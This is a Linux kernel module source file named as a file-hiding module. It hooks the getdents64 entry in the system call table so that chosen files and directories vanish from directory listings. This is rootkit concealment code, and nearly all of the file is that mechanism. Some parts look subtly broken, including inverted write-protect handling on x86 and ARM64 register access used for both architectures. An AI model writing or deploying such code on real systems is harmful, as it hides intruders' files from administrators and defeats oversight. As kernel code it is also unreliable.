/*
 * hook_manager.c - Hook core manager
 * File hiding module - 使用 syscall table hook 方式
 */

#include <linux/module.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/fcntl.h>
#include <linux/unistd.h>
#include <linux/set_memory.h>

#include "hook.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("HOOK");
MODULE_DESCRIPTION("File Hiding Module");
MODULE_VERSION("1.0");

/* Hidden file/folder storage */
static struct hidden_entry hidden_files[MAX_HIDDEN_FILES];
static int hidden_count;
static DEFINE_SPINLOCK(hidden_lock);

/* Syscall table */
static void **sys_call_table_ptr;

#define SYSCALL_GETDENTS64_NR __NR_getdents64

typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs *regs);

static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);

/* Directory entry structure */
struct linux_dirent64 {
	u64 d_ino;
	s64 d_off;
	unsigned short d_reclen;
	unsigned char d_type;
	char d_name[256];
};

int add_hidden_file(const char *name, bool is_dir)
{
	unsigned long flags;
	int i;

	if (!name || strlen(name) >= sizeof(hidden_files[0].name))
		return -EINVAL;

	spin_lock_irqsave(&hidden_lock, flags);

	for (i = 0; i < hidden_count; i++) {
		if (hidden_files[i].active &&
		    strcmp(hidden_files[i].name, name) == 0 &&
		    hidden_files[i].is_dir == is_dir) {
			spin_unlock_irqrestore(&hidden_lock, flags);
			return -EEXIST;
		}
	}

	if (hidden_count >= MAX_HIDDEN_FILES) {
		spin_unlock_irqrestore(&hidden_lock, flags);
		return -ENOSPC;
	}

	strcpy(hidden_files[hidden_count].name, name);
	hidden_files[hidden_count].is_dir = is_dir;
	hidden_files[hidden_count].active = true;
	hidden_count++;

	spin_unlock_irqrestore(&hidden_lock, flags);
	pr_info("[hidefile] add hidden %s: %s\n", is_dir ? "dir" : "file", name);
	return 0;
}

int remove_hidden_file(const char *name)
{
	unsigned long flags;
	int i;

	spin_lock_irqsave(&hidden_lock, flags);

	for (i = 0; i < hidden_count; i++) {
		if (hidden_files[i].active &&
		    strcmp(hidden_files[i].name, name) == 0) {
			hidden_files[i].active = false;
			spin_unlock_irqrestore(&hidden_lock, flags);
			pr_info("[hidefile] remove hidden: %s\n", name);
			return 0;
		}
	}

	spin_unlock_irqrestore(&hidden_lock, flags);
	return -ENOENT;
}

bool is_hidden(const char *name, bool is_dir)
{
	unsigned long flags;
	bool found = false;
	int i;

	if (!name)
		return false;

	spin_lock_irqsave(&hidden_lock, flags);

	for (i = 0; i < hidden_count; i++) {
		if (hidden_files[i].active &&
		    hidden_files[i].is_dir == is_dir &&
		    strcmp(hidden_files[i].name, name) == 0) {
			found = true;
			break;
		}
	}

	spin_unlock_irqrestore(&hidden_lock, flags);
	return found;
}

void clear_hidden_list(void)
{
	unsigned long flags;
	int i;

	spin_lock_irqsave(&hidden_lock, flags);

	for (i = 0; i < hidden_count; i++)
		hidden_files[i].active = false;
	hidden_count = 0;

	spin_unlock_irqrestore(&hidden_lock, flags);
	pr_info("[hidefile] hidden list cleared\n");
}

/* Hooked getdents64 */
static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
	long ret;
	struct linux_dirent64 __user *dirent;
	struct linux_dirent64 *kbuf = NULL;
	struct linux_dirent64 *curr, *write_ptr;
	int count, new_count;
	char name[256];
	int entries_hidden = 0;
	int entries_total = 0;
	int i;

	/* Get arguments: x0=fd, x1=dirent */
	dirent = (struct linux_dirent64 __user *)regs->regs[1];

	/* Call original */
	ret = orig_getdents64(regs);

	pr_info("[hidefile] *** getdents64 CALLED *** ret=%ld, dirent=%px\n", ret, dirent);

	if (ret <= 0)
		return ret;

	count = (int)ret;

	/* Always log when getdents64 is called */
	pr_info("[hidefile] getdents64 hooked: ret=%d, dirent=%px, hidden_count=%d\n", 
		(int)ret, dirent, hidden_count);
	pr_info("[hidefile] hidden list (%d entries):\n", hidden_count);
	for (i = 0; i < hidden_count; i++) {
		if (hidden_files[i].active)
			pr_info("  [%d] name=%s, is_dir=%d\n",
				i, hidden_files[i].name, hidden_files[i].is_dir);
	}

	/* Allocate kernel buffer */
	kbuf = kmalloc(count + 256, GFP_ATOMIC);
	if (!kbuf) {
		pr_err("[hidefile] kmalloc failed\n");
		return ret;
	}

	/* Copy from user space */
	if (copy_from_user(kbuf, dirent, count)) {
		pr_err("[hidefile] copy_from_user failed\n");
		kfree(kbuf);
		return ret;
	}

	/* Filter hidden entries */
	curr = kbuf;
	write_ptr = kbuf;
	new_count = 0;

	while (curr < kbuf + count) {
		unsigned short reclen = curr->d_reclen;

		if (reclen == 0) {
			pr_warn("[hidefile] reclen=0, breaking\n");
			break;
		}

		memset(name, 0, sizeof(name));
		strncpy(name, curr->d_name, sizeof(name) - 1);
		entries_total++;

		pr_info("[hidefile]   [%d] entry: name=%s, d_type=%d (%s)",
			entries_total, name, curr->d_type,
			curr->d_type == DT_DIR ? "DIR" : "FILE");

		if (is_hidden(name, curr->d_type == DT_DIR)) {
			entries_hidden++;
			pr_info("[hidefile]   --> HIDDEN: %s", name);
		} else {
			/* Keep this entry */
			if (write_ptr != curr)
				memcpy(write_ptr, curr, reclen);
			write_ptr = (struct linux_dirent64 *)((char *)write_ptr + reclen);
			new_count += reclen;
		}

		curr = (struct linux_dirent64 *)((char *)curr + reclen);
	}

	pr_info("[hidefile] === RESULT: total=%d, hidden=%d, returned=%d ===\n",
		entries_total, entries_hidden, new_count);

	/* Copy back to user space if entries were hidden */
	if (new_count < count) {
		if (copy_to_user(dirent, kbuf, new_count)) {
			pr_err("[hidefile] copy_to_user failed\n");
			kfree(kbuf);
			return ret;
		}
		ret = new_count;
	}

	kfree(kbuf);
	return ret;
}

/* External vfs hook functions */
extern int vfs_hook_init(void);
extern void vfs_hook_exit(void);

static bool hooked;
static unsigned long page_addr;
static int page_order;

static int __init hook_init(void)
{
	unsigned long *table;
	unsigned long addr;
	int ret;

	pr_info("[hidefile] initializing...\n");

	/* Find sys_call_table */
	table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
	if (!table) {
		pr_err("[hidefile] sys_call_table not found\n");
		return -ENOENT;
	}
	sys_call_table_ptr = (void **)table;
	pr_info("[hidefile] sys_call_table = %px\n", sys_call_table_ptr);

	/* Save original */
	orig_getdents64 = (typeof(orig_getdents64))sys_call_table_ptr[SYSCALL_GETDENTS64_NR];
	if (!orig_getdents64) {
		pr_err("[hidefile] original getdents64 not found\n");
		return -ENOENT;
	}
	pr_info("[hidefile] orig_getdents64 = %px\n", orig_getdents64);

#ifdef CONFIG_X86_64
	/* Make writable */
	cr4_set_bits((unsigned long *)X86_CR4_WP);
#elif defined(CONFIG_ARM64)
	/* Make page writable for ARM64 */
	addr = (unsigned long)sys_call_table_ptr;
	page_addr = addr & PAGE_MASK;
	page_order = get_order(sizeof(void *) * SYSCALL_GETDENTS64_NR);
	ret = set_memory_rw(page_addr, 1 << page_order);
	if (ret) {
		pr_err("[hidefile] set_memory_rw failed: %d\n", ret);
		return ret;
	}
#endif

	/* Hook */
	sys_call_table_ptr[SYSCALL_GETDENTS64_NR] = (void *)hook_getdents64;
	hooked = true;

#ifdef CONFIG_X86_64
	cr4_clear_bits((unsigned long *)X86_CR4_WP);
#endif

	ret = vfs_hook_init();
	if (ret < 0)
		pr_warn("[hidefile] vfs_hook_init failed: %d\n", ret);

	pr_info("[hidefile] module initialized\n");
	return 0;
}

static void __exit hook_exit(void)
{
	if (hooked) {
#ifdef CONFIG_ARM64
		set_memory_ro(page_addr, 1 << page_order);
#endif
#ifdef CONFIG_X86_64
		cr4_set_bits((unsigned long *)X86_CR4_WP);
#endif
		sys_call_table_ptr[SYSCALL_GETDENTS64_NR] = (void *)orig_getdents64;
#ifdef CONFIG_X86_64
		cr4_clear_bits((unsigned long *)X86_CR4_WP);
#endif
		pr_info("[hidefile] unhooked getdents64\n");
	}

	vfs_hook_exit();
	clear_hidden_list();
	pr_info("[hidefile] module exited\n");
}

module_init(hook_init);
module_exit(hook_exit);
